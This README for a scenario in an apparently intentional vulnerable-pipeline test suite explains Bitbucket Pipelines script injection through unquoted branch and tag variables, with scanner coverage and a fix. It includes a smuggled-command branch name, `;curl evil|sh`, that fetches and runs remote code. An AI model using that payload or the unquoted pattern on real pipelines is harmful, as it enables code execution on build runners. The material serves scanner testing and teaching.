# Scenario 62: Bitbucket — `$BITBUCKET_*` script injection

**Provider:** Bitbucket Pipelines · **OWASP:** CICD-SEC-4 (Poisoned Pipeline Execution)

**Vulnerable pipeline:** [`bitbucket-pipelines.yml`](bitbucket-pipelines.yml)

## The pattern

```yaml
- echo "Deploying $BITBUCKET_BRANCH"
- git log --oneline origin/$BITBUCKET_PR_DESTINATION_BRANCH
```

Attacker-influenced default variables (`$BITBUCKET_BRANCH`,
`$BITBUCKET_PR_DESTINATION_BRANCH`, `$BITBUCKET_TAG`) used **unquoted** in a
`script:` command.

## How an attacker exploits it

Branch/tag/PR metadata are attacker-controllable; a branch named `;curl evil|sh`
yields command execution on the runner — same class as CircleCI scenario 56 /
GitHub Actions scenario 31.

## Expected scanner coverage

| Scanner | Detection |
|---------|-----------|
| pipeline-check | `BB-002` — script injection via attacker-controllable context |
| Checkov | — |

## Fix

Always double-quote variable expansions; validate/allow-list branch names; treat
all `$BITBUCKET_*` SCM metadata as untrusted input.

## References

- Atlassian — Variables and secrets: https://support.atlassian.com/bitbucket-cloud/docs/variables-and-secrets/
